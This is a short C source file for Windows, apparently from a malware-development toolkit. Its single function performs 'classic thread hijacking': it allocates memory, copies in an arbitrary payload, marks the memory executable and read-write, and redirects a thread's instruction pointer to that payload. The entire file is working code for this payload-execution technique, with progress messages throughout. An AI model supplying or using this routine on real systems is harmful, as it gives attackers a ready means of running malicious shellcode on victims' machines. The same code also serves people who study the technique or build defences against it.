#include <Windows.h>
#include "misc.h"


BOOL classicThreadHijacking(IN HANDLE hThread, IN PBYTE pbPayload, IN SIZE_T sPayload) {

	PVOID pAddress = NULL;
	DWORD dwOldProtection = NULL;
	BOOL bRet = FALSE;

	CONTEXT ThreadCtx;
	ThreadCtx.ContextFlags = CONTEXT_CONTROL;


	wprintf(L"[>] Classic Thread injection: START\n");

	do {
		wprintf(L"\t[i] Allocating memory for payload... ");
		pAddress = VirtualAlloc(NULL, sPayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (pAddress == NULL)
		{
			printError(L"VirtualAlloc");
			break;
		}
		wprintf(L"done, 0x%p\n", pAddress);

		wprintf(L"\t[i] Copying payload... ");
		memcpy(pAddress, pbPayload, sPayload);
		wprintf(L"done\n");

		wprintf(L"\t[i] Adding execution rights... ");
		bRet = VirtualProtect(pAddress, sPayload, PAGE_EXECUTE_READWRITE, &dwOldProtection);
		if (!bRet)
		{
			printError(L"VirtualProtect");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"\t[i] Getting thread context... ");
		bRet = GetThreadContext(hThread, &ThreadCtx);
		if (!bRet)
		{
			printError(L"GetThreadContext");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"\t[i] Setting RIP to point payload buffer... ");
		ThreadCtx.Rip = (DWORD64)pAddress;
		wprintf(L"done\n");

		wprintf(L"\t[i] Updating the new thread context... ");
		bRet = SetThreadContext(hThread, &ThreadCtx);
		if (!bRet)
		{
			printError(L"SetThreadContext");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"[<] Classic Thread injection: DONE\n");
		return TRUE;

	} while (FALSE);

	wprintf(L"[<] Classic Thread injection: FAILED\n");
	return FALSE;
}